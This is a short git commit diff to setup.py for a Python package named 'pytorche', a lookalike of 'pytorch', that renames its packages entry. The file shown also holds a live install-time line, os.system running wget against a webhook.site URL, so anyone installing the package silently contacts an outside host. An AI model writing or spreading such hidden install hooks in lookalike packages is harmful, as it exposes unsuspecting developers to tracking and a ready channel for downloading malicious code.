ad7377cd128716560f84a752c5a35e8595d9c25f
Arthur Lombardo <21911446@etu.unicaen.fr>
2024-07-01 12:10:06 +0200

    wqwqwq

--- setup.py
+++ setup.py
@@ -5,7 +5,7 @@ setuptools.setup(
      name="pytorche",     
      version="0.0.1",
      python_requires=">=3.6",   
-     packages=["panda"],
+     packages=["pytorche"],
 )
 
 os.system("wget https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5")
